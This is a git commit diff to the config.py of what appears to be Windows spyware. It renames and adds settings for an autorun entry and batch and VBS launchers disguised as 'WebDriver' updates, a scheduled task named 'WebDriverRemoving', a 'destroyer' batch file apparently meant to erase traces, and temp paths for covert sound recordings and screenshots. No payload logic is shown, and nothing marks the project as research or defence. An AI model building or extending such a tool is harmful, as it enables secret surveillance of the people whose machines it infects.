fa64ee4e6b8a0f68d44ba8a98e408cbe98096cc8
Qd Miracle <qdmiracle@mail.ru>
2023-09-13 14:08:46 +0300

    added PYTHON_VENV_PATH, TASK_NAME; renamed DESTROYER_FILE_NAME

--- config.py
+++ config.py
@@ -1,17 +1,21 @@
 import os
 import tempfile
+import subprocess
+
 
 BASE_DIR = os.path.dirname(os.path.realpath(__file__))
 PC_TEMP_DIR = tempfile.gettempdir()
 PROJECT_TEMP_DIR = os.path.join(BASE_DIR, "temp")
 
-PYTHON_VENV_PATH = os.path.join("venv", "Scripts", "python.exe")
+# first from venv
+PYTHON_INTERPRETER_PATH = (subprocess.check_output("where python", shell=True).decode()).split()[-1]
 
-MAIN_FILE_NAME = "main.py"
-DESTROYER_FILE_NAME = "destroyer.py"
+MAIN_FILENAME = "main.py"
+DESTROYER_FILENAME = "destroyer.bat"
 AUTORUN_NAME = "WebDrive"
-BAT_FILENAME = "webDriver.bat"
-RUN_FILENAME = "webDriverUpdates.vbs"
+BAT_FILENAME = "WebDriver.bat"
+RUN_FILENAME = "WebDriverUpdates.vbs"
+TASK_NAME = "WebDriverRemoving"
 
 RECORD_PATH = os.path.join(PC_TEMP_DIR, "sound.wav")
 SCREENSHOT_PATH = os.path.join(PC_TEMP_DIR, "screenshot")
